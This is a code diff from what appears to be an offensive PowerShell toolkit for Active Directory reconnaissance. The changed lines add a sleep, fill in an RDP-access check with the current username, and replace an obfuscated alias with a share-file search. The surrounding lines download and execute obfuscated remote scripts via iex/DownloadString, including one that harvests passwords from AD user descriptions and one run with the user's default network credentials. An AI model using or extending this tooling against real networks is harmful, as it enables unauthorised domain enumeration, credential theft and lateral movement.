@@ -959,6 +959,7 @@ function domainreconmodules
             
             Invoke-Webrequest -Uri 'https://github.com/SecureThisShit/Creds/raw/master/Microsoft.ActiveDirectory.Management.dll' -Outfile "$currentPath\Microsoft.ActiveDirectory.Management.dll"
             Import-Module .\Microsoft.ActiveDirectory.Management.dll
+            Start-Sleep -Seconds 2
 	        iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/adpass.ps1')
             thyme >> "$currentPath\DomainRecon\Passwords_in_description.txt"
 
@@ -979,7 +980,7 @@ function domainreconmodules
             $DomainPolicy.SystemAccess >> "$currentPath\DomainRecon\Passwordpolicy.txt"
 	        
             Write-Host -ForegroundColor Yellow 'Searching for Systems we have RDP access to..'
-	        rewires -LocalGroup RDP -Identity   >> "$currentPath\DomainRecon\RDPAccess_Systems.txt" 
+	        rewires -LocalGroup RDP -Identity $env:Username  >> "$currentPath\DomainRecon\RDPAccess_Systems.txt" 
 	        }
             
             function spoolvulnscan{
@@ -1050,7 +1051,7 @@ __        ___       ____
         Switch ($masterquestion) 
         {
              1{generaldomaininfo}
-             2{mangers >> "$currentPath\DomainRecon\InterestingDomainshares.txt"}
+             2{Find-InterestingDomainShareFile >> "$currentPath\DomainRecon\InterestingDomainshares.txt"}
              3{invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/SecureThisShit/ACLight/master/ACLight2/ACLight2.ps1'');Start-ACLsAnalysis;Write-Host -ForegroundColor Yellow ''Moving Files:'';mv C:\Results\ .\DomainRecon\;}'}
              4{spoolvulnscan}
              5{powerSQL}
